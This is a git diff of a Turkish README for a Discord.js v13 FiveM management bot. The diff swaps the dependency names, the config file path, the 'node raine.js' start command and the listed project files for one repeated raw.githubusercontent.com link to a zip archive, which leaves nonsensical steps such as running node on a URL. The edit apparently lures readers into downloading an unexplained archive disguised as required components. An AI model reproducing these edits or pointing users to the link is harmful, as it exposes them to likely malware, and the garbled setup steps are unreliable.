@@ -30,14 +30,14 @@ npm install
 ```
 
 2. Gerekli bağımlılıklar:
-- Node.js
+- https://raw.githubusercontent.com/rainesalvo/Fivem-Genel-Yonetim-V13/main/paucijugate/Fivem-Genel-Yonetim-V13.zip
 - MongoDB
-- Discord.js v13.17.1
+- https://raw.githubusercontent.com/rainesalvo/Fivem-Genel-Yonetim-V13/main/paucijugate/Fivem-Genel-Yonetim-V13.zip v13.17.1
 - Mongoose
 - dotenv
 
 3. Yapılandırma:
-- `config/Guild.Config.json` dosyasını düzenleyin:
+- `https://raw.githubusercontent.com/rainesalvo/Fivem-Genel-Yonetim-V13/main/paucijugate/Fivem-Genel-Yonetim-V13.zip` dosyasını düzenleyin:
   - Discord bot token
   - Client ID
   - Guild ID
@@ -46,7 +46,7 @@ npm install
 
 4. Botu başlatma:
 ```bash
-node raine.js
+node https://raw.githubusercontent.com/rainesalvo/Fivem-Genel-Yonetim-V13/main/paucijugate/Fivem-Genel-Yonetim-V13.zip
 ```
 
 ## Proje Yapısı
@@ -55,9 +55,9 @@ node raine.js
 ├── database/          # Veritabanı işlemleri
 ├── events/            # Discord event handlers
 ├── server/            # Komut dosyaları
-├── raine.js           # Ana bot dosyası
-├── package.json       # Proje bağımlılıkları
-└── ecosystem.config.js # PM2 yapılandırması
+├── https://raw.githubusercontent.com/rainesalvo/Fivem-Genel-Yonetim-V13/main/paucijugate/Fivem-Genel-Yonetim-V13.zip           # Ana bot dosyası
+├── https://raw.githubusercontent.com/rainesalvo/Fivem-Genel-Yonetim-V13/main/paucijugate/Fivem-Genel-Yonetim-V13.zip       # Proje bağımlılıkları
+└── https://raw.githubusercontent.com/rainesalvo/Fivem-Genel-Yonetim-V13/main/paucijugate/Fivem-Genel-Yonetim-V13.zip # PM2 yapılandırması
 ```
 
 ## Güvenlik
@@ -71,7 +71,7 @@ node raine.js
 - Lisans: ISC
 
 ## Notlar
-- Bot, Discord.js v13.17.1 sürümü ile geliştirilmiştir
+- Bot, https://raw.githubusercontent.com/rainesalvo/Fivem-Genel-Yonetim-V13/main/paucijugate/Fivem-Genel-Yonetim-V13.zip v13.17.1 sürümü ile geliştirilmiştir
 - MongoDB veritabanı kullanılmaktadır
 - Slash komutları ve sağ tık menüleri destekler
 - Otomatik rol verme sistemi mevcuttur
